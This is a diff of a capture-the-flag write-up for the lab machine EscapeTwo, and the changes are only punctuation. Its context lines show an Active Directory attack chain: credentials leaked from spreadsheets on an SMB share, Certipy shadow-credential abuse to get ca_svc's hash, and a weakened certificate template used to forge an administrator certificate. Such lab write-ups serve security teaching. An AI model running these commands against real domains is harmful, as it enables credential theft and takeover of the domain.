@@ -70,7 +70,7 @@ LDAP  Administrator  Guest  krbtgt  michael  ryan  oscar  sql_svc  rose  ca_svc
 
 ::: stage n=2 label="CREDS" title="`Accounting Department` share → corrupt `.xlsx` leaks XML creds."
 
-`smbclient -L` lists an `Accounting Department` share readable by rose. Two spreadsheets: `accounting_2024.xlsx` and `accounts.xlsx`. Both open corrupted in Excel — but `.xlsx` is just a zip of XML.
+`smbclient -L` lists an `Accounting Department` share readable by rose. Two spreadsheets: `accounting_2024.xlsx` and `accounts.xlsx`. Both open corrupted in Excel, but `.xlsx` is just a zip of XML.
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ smbclient "//10.10.11.51/Accounting Department" -U rose
@@ -84,7 +84,7 @@ $ cat accounts/xl/sharedStrings.xml
 <t>MSSQL@somelongstring...</t>
 :::
 
-The most interesting leak is {red:sa@sequel.htb} — the MSSQL `sa` login.
+The most interesting leak is {red:sa@sequel.htb}, the MSSQL `sa` login.
 
 ::: img src="../assets/img/writeups/htb-escapetwo/02-xlsx-xml.png" caption="accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb"
 
@@ -149,7 +149,7 @@ $ certipy-ad shadow auto -u 'ryan@sequel.htb' -p '[REDACTED]' -account ca_svc
 [*] NT hash for 'ca_svc': [REDACTED]
 :::
 
-Enumerate the 34 templates — `DunderMifflinAuthentication` is the deliberately-weakened one. Grab a ticket for `ca_svc`, forge a certificate for {red:administrator@sequel.htb}:
+Enumerate the 34 templates. `DunderMifflinAuthentication` is the deliberately-weakened one. Grab a ticket for `ca_svc`, forge a certificate for {red:administrator@sequel.htb}:
 
 ::: terminal title="shell · ryan · certipy" lang="bash"
 $ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k \
